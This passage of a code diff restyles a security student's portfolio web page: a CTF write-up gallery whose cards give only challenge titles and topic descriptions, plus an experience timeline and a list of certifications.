-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_easyforensics_card_title">Easy Forensics
-                        </h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_easyforensics_card_desc">Memory Forensics
-                            with Volatility</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">ASICS 2024</span>
-                        </div>
-                    </div>
-
-                    <!-- Known Unknowns - UWSP 2024 -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="known-unknowns">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded"
-                                data-i18n="ctf_difficulty_medium">Medium</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_knownunknowns_card_title">Known Unknowns
-                        </h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_knownunknowns_card_desc">Audio
-                            Steganography & Spectrograms</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">UWSP 2024</span>
-                        </div>
-                    </div>
-
-                    <!-- tet-riffic! - niteCTF -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="tet-riffic">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-red-500/10 text-red-400 rounded"
-                                data-i18n="ctf_difficulty_hard">Hard</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_tetriffic_card_title">tet-riffic!</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_tetriffic_card_desc">USB Traffic Analysis &
-                            QR Code Reconstruction</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">niteCTF</span>
-                        </div>
-                    </div>
-
-                    <!-- St3g0 - picoCTF -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="st3g0">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-green-500/10 text-green-400 rounded"
-                                data-i18n="ctf_difficulty_easy">Easy</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_st3g0_card_title">St3g0</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_st3g0_card_desc">PNG LSB Steganography</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">picoCTF</span>
-                        </div>
-                    </div>
-
-                    <!-- Verify - picoCTF -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="verify">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-green-500/10 text-green-400 rounded"
-                                data-i18n="ctf_difficulty_easy">Easy</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_verify_card_title">Verify</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_verify_card_desc">Checksum Verification &
-                            Bash Scripting</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">picoCTF</span>
-                        </div>
-                    </div>
-
-                    <!-- m00nwalk - picoCTF -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="m00nwalk">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded"
-                                data-i18n="ctf_difficulty_medium">Medium</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_m00nwalk_card_title">m00nwalk</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_m00nwalk_card_desc">SSTV Audio Signal
-                            Decoding</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">picoCTF</span>
-                        </div>
-                    </div>
-
-                    <!-- Gimme Your Point - VCSPassport2025 -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="gimme-your-point">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-red-500/10 text-red-400 rounded"
-                                data-i18n="ctf_difficulty_hard">1000 pts</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_gyp_card_title">Gimme Your Point</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_gyp_card_desc">SharePoint CVE-2025-49704 &
-                            Malware Analysis</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">VCSPassport2025</span>
-                        </div>
-                    </div>
-
-                    <!-- FOR2 - ICMP Backdoor -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="for2-icmp">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded"
-                                data-i18n="ctf_difficulty_medium">Medium</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded"
-                                data-i18n="ctf_category_forensic">Forensic</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_for2_card_title">FOR2 - ICMP Backdoor</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_for2_card_desc">PCAP Analysis & C2 Command
-                            Extraction</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">VCSPassport2024</span>
-                        </div>
-                    </div>
-
-                    <!-- RE02 - Excel Macro -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="reverse" data-writeup="re02-macro">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded"
-                                data-i18n="ctf_difficulty_medium">Medium</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-orange-500/10 text-orange-400 rounded"
-                                data-i18n="ctf_category_reverse">Reverse</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_re02_card_title">RE02 - Excel Macro
-                            Analysis</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_re02_card_desc">XLM Macro De-obfuscation
-                            with oletools</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
-                            </div>
-                            <span class="text-xs font-mono text-gray-600">VCSPassport2024</span>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
-        </section>
-
-        <!-- Professional Timeline -->
-        <section id="timeline" class="py-24 px-6">
-            <div class="max-w-4xl mx-auto">
-                <div class="flex items-center gap-3 mb-12">
-                    <i data-lucide="briefcase" class="w-6 h-6 text-blue-accent"></i>
-                    <h2 class="text-3xl font-bold" data-i18n="section_experience">Experience</h2>
-                </div>
-
-                <div class="relative">
-                    <!-- Timeline Line -->
-                    <div class="absolute left-[19px] top-0 bottom-0 w-0.5 timeline-line"></div>
-
-                    <!-- Timeline Items -->
-                    <div class="space-y-12">
-
-                        <!-- Prospire -->
-                        <div class="relative flex gap-6">
-                            <div class="w-4 h-4 rounded-full bg-emerald-accent flex-shrink-0 z-10 mt-3">
-                            </div>
-                            <div class="flex-1 glass-card rounded-xl p-6">
-                                <div class="flex items-center justify-between mb-2">
-                                    <div class="flex items-center gap-3">
-                                        <img src="assets/logo/Logo_Prospire.svg" alt="Prospire Logo"
-                                            class="h-6 w-auto brightness-150">
-                                        <h3 class="text-xl font-bold">Prospire</h3>
-                                    </div>
-                                    <span
-                                        class="px-3 py-1 text-xs font-mono bg-emerald-accent/10 text-emerald-accent rounded-full">May
-                                        2023 - Present</span>
-                                </div>
-                                <p class="text-gray-400 text-sm mb-3" data-i18n="exp_prospire_role">Co-founder & Tech
-                                    Lead</p>
-                                <p class="text-gray-500 text-sm" data-i18n="exp_prospire_desc">
-                                    Building algo-trading platform and automation solutions.
-                                    Leading technical architecture and security implementation.
-                                </p>
+                            <div class="project-tags">
+                                <span class="tag tag-gray">Telegram API</span>
+                                <span class="tag tag-gray">Producer-Consumer</span>
+                                <span class="tag tag-gray">Selenium</span>
+                                <span class="tag tag-gray">BeautifulSoup</span>
                             </div>
                         </div>
-
-                        <!-- Viettel IDC -->
-                        <div class="relative flex gap-6">
-                            <div class="w-4 h-4 rounded-full bg-blue-accent flex-shrink-0 z-10 mt-3">
-                            </div>
-                            <div class="flex-1 glass-card rounded-xl p-6">
-                                <div class="flex items-center justify-between mb-2">
-                                    <div class="flex items-center gap-3">
-                                        <img src="assets/logo/Logo_ViettelIDC.svg" alt="Viettel IDC Logo"
-                                            class="h-6 w-auto brightness-150">
-                                        <h3 class="text-xl font-bold">Viettel IDC</h3>
-                                    </div>
-                                    <span
-                                        class="px-3 py-1 text-xs font-mono bg-blue-accent/10 text-blue-accent rounded-full">Jul
-                                        - Oct 2025</span>
-                                </div>
-                                <p class="text-gray-400 text-sm mb-3" data-i18n="exp_viettel_role">Security Engineer
-                                    Intern</p>
-                                <p class="text-gray-500 text-sm" data-i18n="exp_viettel_desc">
-                                    Gained hands-on experience in enterprise security operations
-                                    and data center infrastructure.
-                                </p>
-                            </div>
-                        </div>
-
-                        <!-- HPT -->
-                        <div class="relative flex gap-6">
-                            <div class="w-4 h-4 rounded-full bg-gray-500 flex-shrink-0 z-10 mt-3">
-                            </div>
-                            <div class="flex-1 glass-card rounded-xl p-6">
-                                <div class="flex items-center justify-between mb-2">
-                                    <div class="flex items-center gap-3">
-                                        <img src="assets/logo/Logo_HPT.svg" alt="HPT Vietnam Logo"
-                                            class="h-10 w-auto brightness-150 object-contain">
-                                        <h3 class="text-xl font-bold">HPT Vietnam Corporation</h3>
-                                    </div>
-                                    <div class="flex items-center gap-2">
-                                        <span
-                                            class="px-2 py-1 text-xs font-mono bg-blue-accent/10 text-blue-accent rounded-full">9.2/10</span>
-                                        <span
-                                            class="px-3 py-1 text-xs font-mono bg-gray-500/10 text-gray-400 rounded-full">Dec
-                                            2023 - Apr 2024</span>
-                                    </div>
-                                </div>
-                                <p class="text-gray-400 text-sm mb-3" data-i18n="exp_hpt_role">Security Training Program
-                                </p>
-                                <p class="text-gray-500 text-sm" data-i18n="exp_hpt_desc">
-                                    Completed advanced security training with top performance.
-                                    Focus on network security and threat analysis.
-                                </p>
-                            </div>
-                        </div>
-
-
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Certifications -->
-        <section id="certifications" class="py-24 px-6 section-glass overflow-hidden">
-            <div class="max-w-6xl mx-auto">
-                <div class="flex items-center gap-3 mb-12">
-                    <i data-lucide="award" class="w-6 h-6 text-emerald-accent"></i>
-                    <h2 class="text-3xl font-bold" data-i18n="section_certifications">Certifications</h2>
+        <!-- CTF Vault Section -->
+        <section class="section" id="vault">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="flag" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_vault">CTF Vault</h2>
                 </div>
 
-                <!-- Certification Cards -->
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="filter-buttons">
+                    <button class="filter-btn active" data-filter="all" data-i18n="filter_all">All</button>
+                    <button class="filter-btn" data-filter="forensic" data-i18n="filter_forensic">Forensic</button>
+                    <button class="filter-btn" data-filter="reverse" data-i18n="filter_reverse">Reverse</button>
+                    <button class="filter-btn" data-filter="web" data-i18n="filter_web">Web</button>
+                    <button class="filter-btn" data-filter="misc" data-i18n="filter_misc">Misc</button>
+                </div>
 
-                    <!-- Partner: Cloud Security -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                <div class="grid-3">
+                    <!-- EzLogic -->
+                    <div class="card writeup-card" data-writeup="ezlogic" data-category="reverse">
+                        <div class="writeup-header">
+                            <span class="tag tag-orange">Reverse</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_ezlogic_title">EzLogic</h4>
+                        <p class="writeup-description" data-i18n="ctf_ezlogic_desc">Logic gate reversing challenge from
+                            0CTF 2024</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">0CTF 2024</span>
+                        </div>
+                    </div>
+
+                    <!-- Easy Forensics -->
+                    <div class="card writeup-card" data-writeup="easy-forensics" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_forensics_title">Easy Forensics</h4>
+                        <p class="writeup-description" data-i18n="ctf_forensics_desc">Registry extraction and password
+                            cracking</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">ASICS 2024</span>
+                        </div>
+                    </div>
+
+                    <!-- Known Unknowns -->
+                    <div class="card writeup-card" data-writeup="known-unknowns" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_unknowns_title">Known Unknowns</h4>
+                        <p class="writeup-description" data-i18n="ctf_unknowns_desc">Wireshark DNS traffic analysis</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">UWSP 2024</span>
+                        </div>
+                    </div>
+
+                    <!-- tet-riffic -->
+                    <div class="card writeup-card" data-writeup="tet-riffic" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_tetriffic_title">tet-riffic!</h4>
+                        <p class="writeup-description" data-i18n="ctf_tetriffic_desc">Audio steganography challenge</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">niteCTF</span>
+                        </div>
+                    </div>
+
+                    <!-- St3g0 -->
+                    <div class="card writeup-card" data-writeup="st3g0" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_st3g0_title">St3g0</h4>
+                        <p class="writeup-description" data-i18n="ctf_st3g0_desc">PNG LSB steganography</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">picoCTF</span>
+                        </div>
+                    </div>
+
+                    <!-- Verify -->
+                    <div class="card writeup-card" data-writeup="verify" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_verify_title">Verify</h4>
+                        <p class="writeup-description" data-i18n="ctf_verify_desc">File hash verification challenge</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">picoCTF</span>
+                        </div>
+                    </div>
+
+                    <!-- m00nwalk -->
+                    <div class="card writeup-card" data-writeup="m00nwalk" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_moonwalk_title">m00nwalk</h4>
+                        <p class="writeup-description" data-i18n="ctf_moonwalk_desc">SSTV audio decoding</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">picoCTF</span>
+                        </div>
+                    </div>
+
+                    <!-- Gimme Your Point -->
+                    <div class="card writeup-card" data-writeup="gimme-your-point" data-category="web">
+                        <div class="writeup-header">
+                            <span class="tag tag-blue">Web</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_gimme_title">Gimme Your Point</h4>
+                        <p class="writeup-description" data-i18n="ctf_gimme_desc">Race condition exploitation</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">VCSPassport2025</span>
+                        </div>
+                    </div>
+
+                    <!-- FOR2 ICMP -->
+                    <div class="card writeup-card" data-writeup="for2-icmp" data-category="forensic">
+                        <div class="writeup-header">
+                            <span class="tag tag-green">Forensic</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_for2_title">FOR2 - ICMP Backdoor</h4>
+                        <p class="writeup-description" data-i18n="ctf_for2_desc">ICMP packet analysis & backdoor
+                            detection</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">Training</span>
+                        </div>
+                    </div>
+
+                    <!-- RE02 Macro -->
+                    <div class="card writeup-card" data-writeup="re02-macro" data-category="reverse">
+                        <div class="writeup-header">
+                            <span class="tag tag-orange">Reverse</span>
+                        </div>
+                        <h4 class="writeup-title" data-i18n="ctf_re02_title">RE02 - Excel Macro</h4>
+                        <p class="writeup-description" data-i18n="ctf_re02_desc">VBA macro analysis and decryption</p>
+                        <div class="writeup-footer">
+                            <span class="writeup-cta"><span data-i18n="ctf_read_more">Read More</span> <i
+                                    data-lucide="arrow-right" style="width:16px;height:16px;"></i></span>
+                            <span class="writeup-event">Training</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Experience Section -->
+        <section class="section" id="experience">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="briefcase" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_experience">Experience</h2>
+                </div>
+
+                <div class="timeline">
+                    <!-- Prospire -->
+                    <div class="timeline-item">
+                        <div class="timeline-dot"></div>
+                        <div class="card timeline-content">
+                            <div class="timeline-header">
+                                <div class="timeline-company">
+                                    <img src="assets/logo/Logo_Prospire.svg" alt="Prospire" class="timeline-logo">
+                                    <span class="timeline-company-name">Prospire</span>
+                                </div>
+                                <span class="timeline-date" data-i18n="exp_prospire_date">May 2023 - Present</span>
+                            </div>
+                            <p class="timeline-role" data-i18n="exp_prospire_role">Co-Founder & Founding Engineer</p>
+                            <p class="timeline-description" data-i18n="exp_prospire_desc">Building automated crypto
+                                trading systems and developing high-frequency trading algorithms with real-time market
+                                data processing.</p>
+                        </div>
+                    </div>
+
+                    <!-- Viettel IDC -->
+                    <div class="timeline-item">
+                        <div class="timeline-dot blue"></div>
+                        <div class="card timeline-content">
+                            <div class="timeline-header">
+                                <div class="timeline-company">
+                                    <img src="assets/logo/Logo_ViettelIDC.svg" alt="Viettel IDC" class="timeline-logo">
+                                    <span class="timeline-company-name">Viettel IDC</span>
+                                </div>
+                                <span class="timeline-date blue" data-i18n="exp_viettel_date">Jul - Oct 2025</span>
+                            </div>
+                            <p class="timeline-role" data-i18n="exp_viettel_role">Security Engineer Intern (SOC)</p>
+                            <p class="timeline-description" data-i18n="exp_viettel_desc">SOC operations, threat hunting,
+                                and developing automation tools for security monitoring using ELK Stack.</p>
+                        </div>
+                    </div>
+
+                    <!-- HPT -->
+                    <div class="timeline-item">
+                        <div class="timeline-dot gray"></div>
+                        <div class="card timeline-content">
+                            <div class="timeline-header">
+                                <div class="timeline-company">
+                                    <img src="assets/logo/Logo_HPT.svg" alt="HPT Vietnam" class="timeline-logo">
+                                    <span class="timeline-company-name">HPT Vietnam</span>
+                                </div>
+                                <span class="timeline-date gray" data-i18n="exp_hpt_date">Dec 2023 - Apr 2024</span>
+                            </div>
+                            <p class="timeline-role" data-i18n="exp_hpt_role">Security Training Program</p>
+                            <p class="timeline-description" data-i18n="exp_hpt_desc">Intensive security training
+                                covering penetration testing, incident response, and security analysis methodologies.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Certifications Section -->
+        <section class="section" id="certifications">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="award" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_certifications">Certifications</h2>
+                </div>
+
+                <div class="grid-3">
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/Partner%20Cloud%20Security.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 flex items-center justify-center">
-                            <i data-lucide="cloud" class="w-8 h-8 text-purple-400"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_partner_cloud_title">Partner: Cloud Security
-                        </h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_partner_cloud_desc">Cisco Partner
-                            Specialization</p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">CISCO</span>
-                        </div>
+                        <div class="cert-icon"><i data-lucide="shield"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_cisco_cloud">Partner Cloud Security</h4>
+                        <p class="cert-issuer">Cloud Security</p>
+                        <p class="cert-org">Cisco</p>
                     </div>
 
-                    <!-- CyberOps Associate -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/CyberOps%20Associate.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 flex items-center justify-center">
-                            <i data-lucide="shield" class="w-8 h-8 text-blue-accent"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_cyberops_title">CyberOps Associate</h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_cyberops_desc">Cisco Certified CyberOps
-                            Associate</p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">CISCO</span>
-                        </div>
+                        <div class="cert-icon"><i data-lucide="lock"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_cyberops">CyberOps Associate</h4>
+                        <p class="cert-issuer">Security Operations</p>
+                        <p class="cert-org">Cisco</p>
                     </div>
 
-                    <!-- HPT On-Job Training -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/Certificate%20of%20HPT%20On-Job%20Training.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 flex items-center justify-center">
-                            <i data-lucide="briefcase" class="w-8 h-8 text-gray-300"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_hpt_title">HPT On-Job Training</h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_hpt_desc">Certificate of Completion</p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">HPT</span>
-                        </div>
+                        <div class="cert-icon purple"><i data-lucide="graduation-cap"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_hpt">On-Job Training</h4>
+                        <p class="cert-issuer">Security Training</p>
+                        <p class="cert-org">HPT Vietnam</p>
                     </div>
 
-                    <!-- CCNA Intro -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/CCNAv7%20Introduction%20to%20Networks.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 flex items-center justify-center">
-                            <i data-lucide="network" class="w-8 h-8 text-emerald-accent"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_ccna_intro_title">CCNAv7: Intro to Networks
-                        </h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_ccna_intro_desc">Cisco Networking Academy</p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">CISCO</span>
-                        </div>
+                        <div class="cert-icon"><i data-lucide="network"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_ccna_intro">Introduction to Networks</h4>
+                        <p class="cert-issuer">CCNAv7</p>
+                        <p class="cert-org">Cisco</p>
                     </div>
 
-                    <!-- CCNA Switching -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/CCNA%20Switching%2C%20Routing%2C%20and%20Wireless%20Essentials.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 flex items-center justify-center">
-                            <i data-lucide="wifi" class="w-8 h-8 text-emerald-accent"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_ccna_switch_title">CCNA: Switching, Routing
-                        </h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_ccna_switch_desc">Cisco Networking Academy</p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">CISCO</span>
-                        </div>
+                        <div class="cert-icon"><i data-lucide="router"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_ccna_srw">Switching, Routing, Wireless</h4>
+                        <p class="cert-issuer">CCNA</p>
+                        <p class="cert-org">Cisco</p>
                     </div>
 
-                    <!-- Honorable Fall 2023 -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/Honorable%20Student%20of%20Trimester_Fall%202023.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-yellow-500/20 to-orange-500/20 flex items-center justify-center">
-                            <i data-lucide="award" class="w-8 h-8 text-yellow-400"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_honor_fall23_title">Honorable Student (Fall
-                            2023)</h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_honor_fall23_desc">Academic Excellence Award
-                        </p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">UNIVERSITY</span>
-                        </div>
+                        <div class="cert-icon yellow"><i data-lucide="star"></i></div>
